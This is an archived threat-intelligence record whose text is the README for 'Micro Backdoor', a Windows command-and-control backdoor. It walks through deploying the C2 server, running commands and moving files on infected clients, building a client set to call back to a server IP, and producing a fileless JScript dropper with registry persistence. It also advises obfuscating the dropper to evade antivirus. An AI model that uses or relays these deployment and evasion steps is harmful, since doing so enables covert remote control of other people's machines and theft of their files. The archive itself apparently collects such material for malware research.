{
    "id": "005c2c54-a13e-4ed3-bbcc-d9ce864a70cb",
    "created_at": "2023-01-12T14:58:53.968101Z",
    "updated_at": "2025-03-27T02:05:39.475186Z",
    "deleted_at": null,
    "sha1_hash": "2ebda9e4d6ce009272ac35637a0ecd496f2491d6",
    "title": "2021-05-04 - Cr4sh - MicroBackdoor - Small and convenient C2 tool for Windows targets",
    "authors": "",
    "file_creation_date": "2022-05-27T23:00:15Z",
    "file_modification_date": "2022-05-27T23:00:15Z",
    "file_size": 894077,
    "plain_text": "# Micro Backdoor for Windows\n\n**github.com/cr4sh/microbackdoor**\n\nCr4sh\n\nMicro Backdoor is C2 tool for Windows targets with easy customizable code\nbase and small footprint. Micro Backdoor consists from server, client and\ndropper. It wasn't designed as replacement for your favorite post-exploitation\ntools but rather as really minimalistic thing with all of the basic features in less\nthan 5000 lines of code, client DLL size is less than 20Kb without compression.\n\n\n-----\n\nI m using Micro Backdoor mostly for demonstration purposes as payload for my\nfirmware rootkits and various low level persistence techniques. Its code was\nwritten in couple of nights, so, it might contain bugs and vulnerabilities: use it\nonly for your own risk.\n\nGeneral information\nWeb interface screenshots\nConfiguring the server\nUsing Python API\nDeploying the server\nBuilding Docker container\nConfiguring the client\n\n## General information\n\nMicro Backdoor client supports 32-bit and 64-bit versions of Windows XP, Vista,\n7, 8, 8.1, 10, Server 2003, Server 2003 R2, Server 2008, Server 2008 R2,\nServer 2012, Server 2012 R2, Server 2016 and Server 2019 of any editions,\nlanguages and service packs.\n\nKey features of the Micro Backdoor:\n\nClient dropper is written in Microsoft JScript which makes it extremely\nconvenient for obfuscation: once AV starts to detect the dropper you\neasily can modify its code or apply existing JScript obfuscation tools.\n\nClient can detect SOCKS 4, SOCKS 5 or HTTP proxy server\nconfiguration in the system settings and connect to the server over this\nproxy.\n\nIn order to communicate with the server Micro Backdoor client is using\nend-to-end encrypted protocol with RSA authentication and random\nsession key.\n\nClient dropper is not creating any executable files on the disk: its body is\nstored inside Windows registry values which reduces backdoor footprint\nand makes it more stealth.\n\nBackdoor server is written in Python and can be used on any operating\nsystem. It provides clean and simple web interface which allows to\ninteract with connected clients in convenient way. [Redis database is used](https://redis.io/)\nto store clients state.\n\nBackdoor server keeps track of all events for clients and server in the log\nfiles.\n\n\n-----\n\nFor each connected client Micro Backdoor provides semi-interactive\ncommand shell running in the web browser.\n\nMicro Backdoor has convenient file manager which allows to browse\nclient file system, download and upload the files.\n\nFull Unicode and native languages support by both client and server.\n\nBackdoor server is also providing Python API and command line interface\nto perform any actions with connected clients which is useful for\nautomation and scripting.\n\n## Web interface screenshots\n\nMain web interface page with connected clients list:\n\nCommand shell page:\n\n\n-----\n\nFile manager page:\n\n## Configuring the server\n\n\n-----\n\nMicro Backdoor server code is located in `./server directory, you have to`\nupload its contents to the remote machine where you planning to run the\nserver.\n\nDirectory contents:\n```\n   server.py − Server executable file\n   config.py − Server configuration file\n   access.log − Access log of embedded web server used for admin\n\n```\ninterface\n```\n   server.log − Server log file with messages related to connected\n\n```\nclients\n```\n   server.crt − Server RSA certificate used to encrypt client\n\n```\ncommunication\n```\n   server.key − Server RSA private key, see above\n   downloads/ − Directory to store files downloaded from the clients\n   logs/ − Directory with individual command line history files for each\n\n```\nclient\n```\n   static/ − Directory with static files needed for admin interface\n\n```\nPython program `server.py has a lot of command line options used to`\nconfigure and manage the server, interact with connected clients, etc. Here’s\nhow to get to get the server running:\n\n1. Install needed dependencies:\n```\n$ sudo apt-get install build-essential swig libssl-dev python python-dev\npython-setuptools python-pip\n$ sudo pip install m2crypto pycrypto redis cherrypy defusedxml\n\n```\n1. Install and run Redis database server:\n```\n$ sudo apt-get install redis-server\n$ sudo service redis-server start\n\n```\n1. Edit `config.py file and change default values of` `HTTP_USERS and`\n```\n   HTTP_PATH to secure your server installation.\n\n```\n2. Generate RSA key pair for new installation of the server, it will create\n```\n   server.crt and server.key files:\n$ ./server.py --keys\n\n```\n1. Run the server as background process:\n```\n$ ./server.py --daemon\n\n```\n\n-----\n\n1. Shutdown the server:\n```\n$ ./server.py --shutdown\n\n```\nAlternatively, you can run `server.py with no command line options specified`\nto start the server as interactive shell process (useful for debugging). After the\nserver was started you can open admin interface in the web browser, its URL is\ncomposed from `HTTP_ADDR,` `HTTP_PORT and` `HTTP_PATH options of`\n```\nconfig.py configuration file.\n\n```\nAlso, there’s some options to interact with connected clients from the command\nline.\n\nRetrieve and print list of the currently connected clients:\n```\n$ ./server.py --list\n\n```\nExecute some command on the connected client:\n```\n$ ./server.py --client <client_ID> --exec <command>\n\n```\nUpload some file to the connected client:\n```\n$ ./server.py --client <client_ID> --fput <remote_path> --file\n<local_path>\n\n```\nDownload some file from the connected client:\n```\n$ ./server.py --client <client_ID> --fget <remote_path> --file\n<local_path>\n\n```\nUpdate Micro Backdoor on the client:\n```\n$ ./server.py --client <client_ID> --update <dropper_path>\n\n## Using Python API\n\n```\nAs it was mentioned above, Micro Backdoor server is also providing Python\nAPI to interact with connected clients which is quite useful for automation and\nscripting purposes. Here's some examples how to use this API.\n\nObtain and print connected clients list:\n\n\n-----\n\n```\nfrom server import ClientHelper\n# get clients list\nclients = ClientHelper().client_list()\nfor client in clients:\n  # print client information\n  print('ID = %s, addr = %s' % (client.client_id, client.addr[0]))\n\n```\nExecute console command on the client:\n```\n# create client helper instance\nclient = ClientHelper(client_id)\n# connect to the corresponding child process of the server\nclient.mapper_connect()\n# execute console command\noutput, exit_code = client.execute('whoami')\n# execute console command and redirect its output into the stream\nclient.execute('whoami', stream = sys.stdout)\n\n```\nWork with the file system of the client:\n```\n# create client helper instance\nclient = ClientHelper(client_id)\n# connect to the corresponding child process of the server\nclient.mapper_connect()\n# download file from the client\nclient.file_get('C:\\\\Windows\\\\win.ini', 'win.ini')\n# upload file to the client\nclient.file_put('C:\\\\Users\\\\Test\\\\example.txt', 'example.txt')\n# enumerate files in some directory\nfor size, name in client.file_list('C:\\\\Windows'):\n  if size is None:\n    # print directory name\n    print(' DIR: %s' % name)\n  else\n    # print file name and size\n    print('FILE: %s [%d bytes]' % (name, size))\n\n```\nExecute WMI queries on the client:\n\n\n-----\n\n```\n# create client helper instance\nclient = ClientHelper(client_id)\n# connect to the corresponding child process of the server\nclient.mapper_connect()\n# get CIM_OperatingSystem WMI class\nfor name, value in client.execute_wmi('os').items():\n  # print class member name and value\n  print('%s = %s' % (name, value))\n# get only \"Caption\" class member value\nos_name = client.execute_wmi('os', props = 'Caption')\n\n## Deploying the server\n\n```\n[For easy deployment of Micro Backdoor server there's Fabric scenario located](https://www.fabfile.org/)\nin `fabfile.py Python script. To deploy the server to the remote Linux host`\nyou have to perform the following steps.\n\n1. Edit `.ssh_config file located in the project directory and add your`\n\nserver information there, for example:\n```\nHost my-server\n   HostName my-server.net\n   Port 22\n   User user\n   IdentityFile ~/.ssh/id_rsa\n\n```\n1. Run `./server.py --keys on your local machine to generate RSA key`\n\npair for secure communication between Micro Backdoor client and server.\n\n2. Run `fab deps:host=my-server command to connect to the remote`\n\nhost `my-server over the SSH and install needed dependencies.`\n\n3. Run `fab deploy:host=my-server command to copy needed files to`\n\nthe remote host `my-server and run the server.`\n\n4. You also can run `fab stop to stop running server,` `fab start to start`\n\nit and `fab uninstall to shutdown and remove its files form the remote`\nhost.\n\n## Building Docker container\n\nYou also can run Micro Backdoor server inside Docker container with SSH and\nRedis servers included. To install docker on Ubuntu just run `sudo apt-get`\n```\ninstall docker.io, for others distributives and operating systems please\n\n```\nrefer to [official documentation.](https://docs.docker.com/install/)\n\n\n-----\n\nBefore building the container you need to run `./server.py --keys on your`\nlocal machine to generate RSA key pair for secure communication between\nMicro Backdoor client and server. Then you have to cd into the `docker`\ndirectory and run `make to build docker image and start the container. To stop`\nrunning container you can press Ctrl+C and use `make start / make stop`\ncommands to run it in the background, `make rm to remove container and`\n```\nmake rmi to remove image. To ssh into the running container run make\nshell and enter the password specified in docker/makefile.conf file\n\n```\n(\"acab\" without quotes by default).\n\nNOTE: Before building docker container please ensure that exposed TCP ports\nspecified in `docker/makefile.conf are the same as` `CLIENT_PORT and`\n```\nHTTP_PORT port numbers specified in config.py of the server.\n\n## Configuring the client\n\n```\nMicro Backdoor client consists from the binary part used to implement\nbackdoor functionality and JScript wrapper combined with the shellcode used\nto run and deliver the binary part in file-less way.\n\n⚠ **JScript and PowerShell code used in client dropper is easily**\n**detectable by most of AV/EDR products, you should consider to modify it**\n**[or use other methods to deliver the binary part of the client](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot)**\n\nFirst, you have to configure the binary using `./client_builder.py`\ncommand line program, it operates with default configuration specified in\n```\n./server/config.py file mentioned in previous part of the document.\n\n```\nInstall [Python pefile library:](https://pypi.org/project/pefile/)\n```\n$ pip install pefile\n\n```\nConfigure the client binary:\n```\n$ ./client_builder.py client.dll [server_IP]\n\n```\nAlso, you can specify `client_amd64.dll file to use x86_64 version of the`\nclient, or `client_debug.dll / client_amd64_debug.dll to use debug build`\nof the client that prints diagnostic messages into the standard Windows debug\noutput. Before running `client_builder.py you need to generate RSA key`\npair, see Configuring the server section of this document.\n\nYou can use configured client binary with your own delivery tool: exploit,\nreflective loader, etc. Or you can generate JScript client dropper:\n```\n$ ./client_encoder.py dll_inject_script client.dll > dropper.js\n\n```\n\n-----\n\nPlease note, that JScript/PowerShell reflective loader generated by\n```\nclient_encoder.py is working only with 32-bit versions of the client binary\n\n```\non both 32-bit and 64-bit Windows targets. 64-bit client binaries are provided\nonly for convenience in case if you need to use them with your own loaders\nand tools.\n\nAfter the `dropper.js was generated you can deploy it on your targets. In`\nWindows command line you can run JScript files by running `cscript.exe`\n```\ndropper.js . Or you can just double click JS file in Windows Explorer to run\n\n```\nthe dropper. Micro Backdoor client provides persistence within current user\naccount used to run the dropper, it can work with any privileges and medium\nintegrity level.\n\n## Developed by\n\nDmytro Oleksiuk (aka Cr4sh)\n\n[cr4sh0@gmail.com](http://10.10.0.46/mailto:cr4sh0@gmail.com)\n\n[http://blog.cr4.sh](http://blog.cr4.sh/)\n\n[@d_olex](http://twitter.com/d_olex)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-04 - Cr4sh - MicroBackdoor - Small and convenient C2 tool for Windows targets.pdf"
    ],
    "report_names": [
        "2021-05-04 - Cr4sh - MicroBackdoor - Small and convenient C2 tool for Windows targets.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535533,
    "ts_updated_at": 1743041139,
    "ts_creation_date": 1653692415,
    "ts_modification_date": 1653692415,
    "files": {
        "pdf": "https://archive.orkl.eu/2ebda9e4d6ce009272ac35637a0ecd496f2491d6.pdf",
        "text": "https://archive.orkl.eu/2ebda9e4d6ce009272ac35637a0ecd496f2491d6.txt",
        "img": "https://archive.orkl.eu/2ebda9e4d6ce009272ac35637a0ecd496f2491d6.jpg"
    }
}